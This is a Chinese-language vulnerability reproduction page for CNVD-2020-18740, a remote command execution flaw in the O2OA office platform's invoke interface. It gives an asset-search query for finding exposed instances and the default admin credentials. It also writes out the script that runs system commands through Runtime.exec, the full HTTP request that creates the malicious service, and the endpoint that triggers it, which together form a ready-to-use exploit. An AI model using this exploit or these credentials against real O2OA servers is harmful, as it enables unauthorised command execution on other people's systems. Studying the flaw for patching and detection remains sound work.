# O2OA invoke 后台远程命令执行漏洞 CNVD-2020-18740

## 漏洞描述

O2OA是一款开源免费的企业及团队办公平台，提供门户管理、流程管理、信息管理、数据管理四大平台,集工作汇报、项目协作、移动OA、文档分享、流程审批、数据协作等众多功能，满足企业各类管理和协作需求。 O2OA系统invoke 接口存在远程代码执行漏洞。攻击者可利用漏洞执行任意代码。

## 漏洞影响

<a-checkbox checked>O2OA</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title=="O2OA"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1661649878832-df6a8d1f-e402-4db0-b567-7d0803a43c0a.png)

默认密码登录后台 xadmin/o2 

![img](../../../.vuepress/public/img/1661649916148-8af674f2-9b77-41e8-bfab-fe47e364140c.png)

在应用中找到服务管理，创建接口代码执行系统命令

```php
var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("id").getInputStream()));

var result = [];
while (true) {
    var oneline = bufReader.readLine();
    result.push(oneline);
    if (!oneline) break;
}
var result = { "Result": result };
this.response.setBody(result, "application/json"); 
```

![img](../../../.vuepress/public/img/1661650002413-1be235fd-5727-4e31-826f-92ae36e44d04.png)

请求包

```php
POST /x_program_center/jaxrs/invoke?v=6.3 HTTP/1.1
Authorization: PfyuxmzgIzrrkjVKSmRBJ4uCkH5tYmpq50QnO7mEHhA

{"id":"cmd","name":"cmd","enableToken":false,"alias":"","description":"","validated":true,"enable":true,"text":"var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"id\").getInputStream()));\n\nvar result = [];\nwhile (true) {\n    var oneline = bufReader.readLine();\n    result.push(oneline);\n    if (!oneline) break;\n}\nvar result = { \"Result\": result };\nthis.response.setBody(result, \"application/json\"); ","remoteAddrRegex":"","createTime":"2022-08-27 04:39:18","updateTime":"2022-08-27 04:39:18"}
```

![img](../../../.vuepress/public/img/1661650118309-8a01cd95-9083-4ac8-8615-6cbde2512630.png)

创建成功后访问接口执行系统命令 

```php
/x_program_center/jaxrs/invoke/cmd/execute
```

![img](../../../.vuepress/public/img/1661650222611-e47cb068-cceb-4aa9-95de-421bb1e026f9.png)